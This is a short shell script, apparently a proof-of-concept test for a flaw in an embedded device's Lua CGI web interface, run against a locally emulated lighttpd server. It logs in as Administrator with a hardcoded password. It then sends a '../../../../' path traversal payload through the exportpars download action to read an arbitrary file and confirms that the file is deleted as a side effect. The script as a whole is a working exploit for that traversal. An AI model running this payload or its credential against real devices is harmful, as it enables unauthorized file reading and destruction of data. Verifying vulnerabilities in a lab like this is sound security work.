#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
CANARY=/opt/setup/templates/exportpars-canary
AUTH=
SERVER_PID=

cleanup() {
  set +e
  rm -f "$CANARY"
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/$2"
}

printf 'EXPORTPARS_CANARY' > "$CANARY"
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

DENIED=$(post 'action=download&location=exportpars&filename=x' utility.lua)
case "$DENIED" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL no-session control: $DENIED"; exit 1;;
esac
echo "PASS exportpars requires a valid session"

AUTH_RESPONSE=$(post 'action=authenticate&username=Administrator&password=O0ANI3' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL Administrator authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS Administrator authentication"

printf 'EXPORTPARS_CANARY' > "$CANARY"
mkdir -p "/opt/tmp/$AUTH/parameters/00000000000000000000000000000000"
/usr/bin/qemu-i386 -L / /usr/bin/lua /opt/xweb/www/cgi-bin/utility.lua "action=download&location=exportpars&filename=../../../../setup/templates/exportpars-canary&SSES=$AUTH" > /opt/setup/templates/exportpars-response
/bin/busybox grep -q EXPORTPARS_CANARY /opt/setup/templates/exportpars-response || { echo "FAIL traversal content"; exit 1; }
rm -f /opt/setup/templates/exportpars-response
echo "PASS exportpars traversal file read"
[ ! -e "$CANARY" ] || { echo "FAIL external file not deleted"; exit 1; }
echo "PASS exportpars external file deletion"
echo "overall: PASS"
